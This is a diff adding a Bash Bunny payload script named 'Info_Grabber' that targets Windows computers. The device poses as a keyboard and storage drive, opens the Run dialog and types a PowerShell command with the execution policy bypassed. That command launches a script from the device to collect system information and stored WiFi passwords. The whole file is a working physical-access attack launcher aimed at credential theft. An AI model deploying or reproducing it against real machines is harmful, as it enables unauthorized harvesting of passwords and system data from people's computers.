@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+# Title:         Info_Grabber
+# Author:        Simen Kjeserud
+# Version:       1.0
+# Target:        Windows
+# Creds:         Hak5Darren for inspiration
+# 
+# Executes run.ps1 which executes scripts that gets you information about
+# the computer running and will also get wifi passwords
+
+
+LED R B 100
+ATTACKMODE HID STORAGE
+
+#Check swith copied from bunny_helper
+
+check_switch() {
+	switch1=`cat /sys/class/gpio_sw/PA8/data`
+	switch2=`cat /sys/class/gpio_sw/PL4/data`
+	switch3=`cat /sys/class/gpio_sw/PL3/data`
+	if [ "x$switch1" = "x0" ] && [ "x$switch2" = "x1" ] && [ "x$switch3" = "x1" ]; then
+		SWITCH_POSITION="switch1"
+	elif [ "x$switch1" = "x1" ] && [ "x$switch2" = "x0" ] && [ "x$switch3" = "x1" ]; then
+		SWITCH_POSITION="switch2"
+	elif [ "x$switch1" = "x1" ] && [ "x$switch2" = "x1" ] && [ "x$switch3" = "x0" ]; then
+		SWITCH_POSITION="switch3"
+	else
+		SWITCH_POSITION="invalid"
+	fi
+}
+
+check_switch
+
+# Set your language here
+QUACK SET_LANGUAGE no
+QUACK GUI r
+QUACK DELAY 200
+# Open run and run the run.ps1 script in the Bashbunny
+QUACK STRING powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+QUACK ENTER
+LED G
+#Green means good to go
